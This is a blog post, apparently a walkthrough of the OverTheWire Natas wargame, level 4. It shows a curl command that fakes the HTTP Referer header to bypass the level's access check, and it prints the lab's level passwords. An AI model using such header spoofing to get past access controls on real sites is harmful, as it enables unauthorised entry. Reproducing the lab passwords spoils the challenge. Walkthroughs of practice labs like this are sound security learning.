---
layout: post
author: mike
categories: natas
---


### Level 3 -> 4
#### Game Instructions
>

Let's go to the new exercise and get logged in:
```
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
```
We get hit with this message:

>Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

So although this really doesn't make sense, there is definitely a way to set/fake the referer with `curl`.

Let's create a command with `curl` that uses the username and password, and also sets the referrer to the desired URL.
```bash
~ curl --user natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
```
This will let us in since we are using the correct user/pass and the correct referring URL. Here's the source code:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
Sweet! Now we have the next level's password:
`Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD`
On to the next!
